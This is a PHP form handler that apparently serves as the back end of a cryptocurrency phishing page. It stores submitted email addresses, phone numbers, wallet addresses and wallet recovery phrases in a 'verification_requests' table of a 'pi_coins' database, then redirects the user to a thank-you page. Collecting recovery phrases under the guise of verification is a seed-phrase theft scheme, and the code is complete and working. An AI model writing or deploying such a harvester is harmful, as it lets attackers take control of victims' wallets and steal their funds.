<?php
// Database configuration
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "pi_coins"; // Replace with your database name

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Retrieve form data
$email = isset($_POST['email']) ? $_POST['email'] : null;
$phone = isset($_POST['phone']) ? $_POST['phone'] : null;
$wallet_address = isset($_POST['wallet_address']) ? $_POST['wallet_address'] : null;
$phrase = isset($_POST['phrase']) ? $_POST['phrase'] : null;

// Insert data into the database
$sql = "INSERT INTO verification_requests (email, phone, wallet_address, recovery_phrase) VALUES (?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssss", $email, $phone, $wallet_address, $phrase);

if ($stmt->execute()) {
    // Redirect to thank-you page
    header("Location: thank_you.php");
    exit();
} else {
    echo "Error: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
